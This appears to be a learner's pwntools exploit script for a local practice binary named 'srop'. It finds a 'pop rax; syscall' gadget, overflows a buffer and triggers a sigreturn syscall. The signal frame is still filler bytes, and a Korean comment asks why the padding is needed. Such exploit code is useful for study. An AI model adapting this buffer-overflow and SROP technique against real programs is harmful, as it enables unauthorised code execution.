#!/usr/bin/env python3
# Name: srop.py
from pwn import *
context.terminal = ['tmux', 'splitw', '-h']
context.arch = 'x86_64'
p = process('./srop')
elf = ELF('./srop')
gadget = next(elf.search(asm('pop rax; syscall')))
print('gadget..', hex(gadget))
payload = b'A'*16
payload += b'B'*8
payload += p64(gadget)
payload += p64(15) # sigreturn
payload += b'\x00'*40 # dummy # 왜 더미가 필요한거지?
payload += p64(0x4141414141414141)*20
print('press enter to continue')
pause()
p.sendline(payload)
p.interactive()